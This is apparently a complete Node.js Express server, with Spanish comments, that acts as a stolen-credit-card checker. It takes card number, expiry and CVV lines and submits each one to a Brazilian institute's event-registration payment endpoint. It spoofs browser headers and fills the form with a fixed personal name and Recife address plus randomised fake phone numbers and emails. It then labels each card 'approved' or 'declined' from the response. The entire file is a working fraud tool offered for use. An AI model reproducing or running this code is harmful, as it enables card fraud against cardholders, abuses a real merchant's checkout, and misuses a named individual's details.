const express = require('express');
const axios = require('axios');
const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.static('public'));

// Función para chequear una tarjeta
async function checkCard(cc, mes, ano, cvv) {
  const randoka = Math.floor(Math.random() * 999999) + 1;
  const randotellk = Math.floor(Math.random() * (9999 - 1111 + 1)) + 1111;

  try {
    const response = await axios({
      method: 'post',
      url: 'https://www.ibresp.com.br/eventos/Finalizar',
      headers: {
        'Content-Type': 'application/json; charset=UTF-8',
        'Host': 'www.ibresp.com.br',
        'Origin': 'https://www.ibresp.com.br',
        'Referer': 'https://www.ibresp.com.br/eventos/Inscricao',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest'
      },
      data: {
        IdCurso: 105,
        Nome: "DANILO BATISTA GOMES",
        CPF: "",
        CEP: "51150-001",
        Endereco: "Marechal Mascarenhas de Moraes, 1982",
        Bairro: "Imbiribeira",
        IdCidade: 3317,
        IdEstado: 17,
        NomeCidade: "RECIFE",
        NomeEstado: "PE",
        Numero: "",
        Celular: `(11) 9${randotellk}-${randotellk}`,
        Email: `yurigomye${randoka}@gmail.com`,
        Cursos: [],
        NomeTitular: "",
        NumeroCartao: cc,
        MesValidade: mes,
        AnoValidade: ano,
        CVV: cvv,
        QuantideParcela: 1,
        TipoPagamento: 2
      },
      timeout: 30000,
      maxRedirects: 10
    });

    const data = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

    if (data.includes('05')) {
      return { status: 'declined', message: '05: Declined', raw: data };
    } else {
      return { status: 'approved', message: 'Approved Card!', raw: data };
    }
  } catch (error) {
    return { 
      status: 'error', 
      message: `Error: ${error.message}`,
      raw: error.toString()
    };
  }
}

// Endpoint para chequear una sola tarjeta
app.post('/check-single-card', async (req, res) => {
  const { card } = req.body;
  const [cc, mes, ano, cvv] = card.split('|');

  if (!cc || !mes || !ano || !cvv) {
    return res.json({
      card: card,
      status: 'error',
      message: 'Invalid format. Use: CC|MM|YYYY|CVV'
    });
  }

  console.log(`Checking card: ${cc}`);
  const result = await checkCard(cc, mes, ano, cvv);

  res.json({
    card: `${cc}|${mes}|${ano}|${cvv}`,
    ...result
  });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});